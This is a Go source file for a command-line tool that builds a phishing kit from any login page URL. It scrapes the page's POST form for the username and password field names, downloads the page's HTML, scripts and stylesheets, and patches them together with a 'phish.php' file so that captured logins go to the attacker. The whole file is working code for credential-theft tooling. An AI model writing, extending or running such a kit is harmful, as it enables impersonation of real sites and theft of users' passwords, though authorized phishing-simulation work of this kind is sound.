package main

import (
	"flag"
	"fmt"
	"net/url"
	"os"
	"path"
	"path/filepath"

	"github.com/gocolly/colly"
)

var (
	destFolder  string
	urlin       string
	agent       string
	phpFilename string
)

// getFormPost checks if there is a POST with an action and returns the path, login attribute name, and password attribute name.
func getFormPost(urlin string, agent string) (string, string, string) {
	c := colly.NewCollector(colly.UserAgent(agent))

	var postPath, postLogin, postPassword string

	c.OnHTML("form[method=post]", func(e *colly.HTMLElement) {
		postPath = e.Attr("action")

		e.ForEach("input[type=text]:not([hidden=hidden])", func(_ int, login *colly.HTMLElement) {
			postLogin = login.Attr("name")
		})

		e.ForEach("input[type=password]", func(_ int, password *colly.HTMLElement) {
			postPassword = password.Attr("name")
		})
	})

	c.Visit(urlin)

	return postPath, postLogin, postPassword
}

func main() {

	// parse flag and cli inputs
	flag.StringVar(&urlin, "url", "", "URL of login page")
	flag.StringVar(&agent, "ua", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1", "User Agent string")
	flag.StringVar(&phpFilename, "php", "phish.php", "Path to the PHP file to be used")
	flag.StringVar(&destFolder, "kits", "kits", "Path used to store the kits")

	flag.Parse()

	// check if url was provided
	if urlin == "" {
		fmt.Fprintf(os.Stderr, "\nEmpty URL, please specify a URL using the -url flag.\n")
		os.Exit(1)

		// remove / from end of url
	} else if string(urlin[len(urlin)-1]) == "/" {
		urlin = urlin[0 : len(urlin)-1]
	}

	printBanner()

	initiateCollector(urlin, agent, destFolder, phpFilename)
}

func initiateCollector(urlin string, agent string, destFolder string, phpFilename string) {
	c := colly.NewCollector(colly.UserAgent(agent))

	// Get parameters of the form in the HTML
	fmt.Printf("Process started!\nNavigating to %s\nuser agent: %s\n\n", urlin, agent)
	postPath, postLogin, postPassword := getFormPost(urlin, agent)

	if postPath == "" || postLogin == "" || postPassword == "" {
		fmt.Printf("[!] error: no compatible form found in the given URL!\n\n")
		os.Exit(1)
	} else {
		fmt.Printf("Parameters found in the form of the given URL:\n- post action: '%s'\n- login attribute name: '%s'\n- password attribute name: '%s'\n\n", postPath, postLogin, postPassword)
	}

	var remotePaths []string
	var localPaths []string

	// Parse given URL to create destination folder for downloaded files
	parsedURL, err := url.Parse(urlin)
	if err != nil {
		fmt.Printf("Error parsing the URL: %s\n", err)
		os.Exit(1)
	}

	// Prepare folder for saving files
	destFolder = filepath.Join(destFolder, parsedURL.Host)
	urlinPath := parsedURL.Path

	// Create destination folder
	if err := mkdirIfNotExist(destFolder); err != nil {
		fmt.Printf("Error creating the destination folder: %s\n", err)
		os.Exit(1)
	}

	// OnResponse -> download file in a specific directory
	c.OnResponse(func(resp *colly.Response) {
		pathfile := resp.Request.URL.RequestURI()

		p, err := url.Parse(resp.Request.URL.String())
		if err != nil {
			fmt.Printf("Error parsing the link of a file: %s\n", err)
			os.Exit(1)
		}

		fold := path.Dir(p.EscapedPath())
		filename := path.Base(p.EscapedPath())

		if fold != "" {
			if err := mkdirIfNotExist(filepath.Join(destFolder, fold)); err != nil {
				fmt.Printf("Error creating the directory to save files: %s\n", err)
				os.Exit(1)
			}
		}

		if urlinPath == pathfile {
			filename = "index.html"
		} else {
			localPaths = append(localPaths, path.Join(fold, filename))
		}

		if err := resp.Save(filepath.Join(destFolder, fold, filename)); err != nil {
			fmt.Printf("Error saving file in the appropriate directory: %s\n", err)
			os.Exit(1)
		}
	})

	// On every script tag found linked in the HTML -> visit and download
	c.OnHTML("script", func(e *colly.HTMLElement) {
		link := e.Attr("src")
		if link != "" && !find(remotePaths, link) {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// On every css file found linked in the HTML -> visit and download
	c.OnHTML("link[rel=stylesheet]", func(e *colly.HTMLElement) {
		link := e.Attr("href")
		if link != "" && !find(remotePaths, link) {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// Start scraping
	c.Visit(urlin)

	// Patch HTML file to make it compatible with the PHP file
	if err := patchHtml(destFolder, remotePaths, localPaths, phpFilename); err != nil {
		fmt.Printf("Error patching the HTML: '%s'\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("HTML file patched and saved in '%s'\n", destFolder)
	}

	// Copy PHP file to the dest folder
	if err := copyPhpToKit(phpFilename, destFolder); err != nil {
		fmt.Printf("Error copying the PHP file in the destination folder: '%s'\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("PHP file saved in '%s'\n", destFolder)
	}

	// Patch the PHP file to make the kit work
	if err := patchPhp(filepath.Join(destFolder, phpFilename), postLogin, postPassword, urlin); err != nil {
		fmt.Printf("Error patching the PHP file: %s\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("\n[*] Operation completed! Kit created for '%s' and saved in '%s'\n", urlin, destFolder)
	}
}
